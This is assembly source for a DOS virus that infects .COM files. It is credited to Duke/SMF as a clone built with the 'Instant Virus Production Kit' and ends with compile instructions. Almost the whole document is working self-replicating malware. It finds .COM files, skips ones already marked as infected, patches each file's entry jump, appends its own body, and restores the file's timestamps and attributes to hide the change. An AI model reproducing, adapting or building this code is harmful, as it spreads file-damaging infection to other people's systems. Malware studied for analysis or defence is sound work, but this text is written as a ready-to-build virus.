;---------
;  IVP clone  written by Duke/SMF
;---------


Code    Segment Public 'Code'
        Assume  CS:Code
        Org     100h                              ; All .COM files start here

*ID = 'DS'                                         ; Id for infected files

Start:
*        db     0e9h,2,0                           ; Jump to the next command
*        dw     id                                 ; So this file doesnt get infected

Virus:
*        call    realcode                          ; Push current location on stack

Realcode:
*        nop
*        nop
*        nop
*        nop
*        pop     si                                ; Get location off stack
*        nop
*        nop
*        sub     si,offset realcode                ; Adjust it for our pointer
*        nop
*        nop
*        nop
*        nop
*        nop
*        mov     bp,si                             ; Set up bp

        lea     si,[bp+offset oldjump]            ; Location of old jump in si
        mov     di,100h                           ; Restore new jump to 100h
        push    di                                ; Save so we could just return when done
        movsb                                     ; Move a byte
        movsw                                     ; Move a word
        movsw                                     ; Move another word

        lea     dx,[bp+offset dta]                ; Where to put New DTA
        call    set_DTA                           ; Move it

        lea     dx,[bp+offset comfilespec]        ; Files to look for
        call    findfirst

        mov     dx,80h                            ; Location of original DTA
        call    set_dta                           ; Put it back there

        retn                                      ; Return to 100h (original jump)

FindFirst:
        mov     ah,4eh                            ; Find first file
        mov     cx,7                              ; Find all attributes

FindNext:
        int     21h                               ; Find first/next file int
        jc      quit                              ; If none found then change dir

        call    infection                         ; Infect that file

FindNext2:
        mov     ah,4fh                            ; Find next file
        jmp     findnext                          ; Jump to the loop

Quit:
        ret

Infection:
        mov     ax,3d00h                          ; Open file for read only
        call    open

        mov     ah,3fh                            ; Read from file
        mov     cx,1ah                            ; Number of bytes
        lea     dx,[bp+offset buffer]             ; Location to store them
        int     21h

        mov     ah,3eh                            ; Close file
        int     21h

        mov     ax,word ptr [bp+DTA+35]           ; Get end of file name in ax
        cmp     ax,'DN'                           ; Does it end in 'ND'?
        jz      quitinfect                        ; Yup so get another file

CheckCom:
        mov     bx,word ptr [bp+offset dta+1ah]   ; Get file size
        cmp     word ptr cs:[bp+buffer+3],id      ; Check for ID
        je      quitinfect

        jmp     infectcom

QuitInfect:
        ret

InfectCom:
        sub     bx,3                              ; Adjust for new jump
        lea     si,[bp+buffer]                    ; Move the old jump first
        lea     di,[bp+oldjump]
        movsb
        movsw
        movsw
        mov     [bp+buffer],byte ptr 0e9h         ; Setup new jump
        mov     word ptr [bp+buffer+1],bx         ; Save new jump

        mov     word ptr [bp+buffer+3],id         ; Put in ID
        mov     cx,5                              ; Number of bytes to write

        jmp     finishinfection
FinishInfection:
        push    cx                                ; save # of bytes to write
        xor     cx,cx                             ; Set attriutes to none
        call    attributes

        mov     al,2                              ; open file read/write
        call    open

        mov     ah,40h                            ; Write to file
        lea     dx,[bp+buffer]                    ; Location of bytes
        pop     cx                                ; Get number of bytes to write
        int     21h
        jc      closefile

        mov     al,02                             ; Move Fpointer to eof
        Call    move_fp

        mov     ah,40h                            ; Write virus to file
        mov     cx,eof-virus                      ; Size of virus
        lea     dx,[bp+offset virus]              ; Location to start from
        int     21h

CloseFile:
        mov     ax,5701h                          ; Set files date/time back
        mov     cx,word ptr [bp+dta+16h]          ; Get old time from dta
        mov     dx,word ptr [bp+dta+18h]          ; Get old date
        int     21h

        mov     ah,3eh                            ; Close file
        int     21h

        xor     cx,cx
        mov     cl,byte ptr [bp+dta+15h]          ; Get old Attributes
        call    attributes

        retn

Move_Fp:
        mov     ah,42h                            ; Move file pointer
        xor     cx,cx                             ; Al has location
        xor     dx,dx                             ; Clear these
        int     21h
        retn

Set_DTA:
        mov     ah,1ah                            ; Move the DTA location
        int     21h                               ; DX has location
        retn

Open:
        mov     ah,3dh                            ; open file
        lea     dx,[bp+DTA+30]                    ; Filename in DTA
        int     21h
        xchg    ax,bx                             ; put file handle in bx
        ret

Attributes:
        mov     ax,4301h                          ; Set attributes to cx
        lea     dx,[bp+DTA+30]                    ; filename in DTA
        int     21h
        ret

Virusname db '[DSVCT11]'                          ; Name Of The Virus
Author    db 'Duke/SMF'                           ; Author Of This Virus
messege:
          db '',10,13
Made_with db '[IVP]',10,13,'$'                    ; Please do not remove this

comfilespec  db  '*.com',0                        ; Holds type of file to look for
oldjump      db  0cdh,020h,0,0,0                  ; Old jump.  Is int 20h for file quit

EOF     equ     $                                 ; Marks the end of file

DTA     db      42 dup (?)                        ; Location of new DTA
Buffer db 1ah dup (?)                             ; Holds exe header

*eov     equ     $                                 ; Used For Calculations

code    ends
        end     start


;---------
;  Instant Virus Production Kit By Admiral Bailey - Youngsters Against McAfee
;  To compile this use TASM /M FILENAME.ASM
;  Then type tlink /t FILENAME.OBJ
;---------

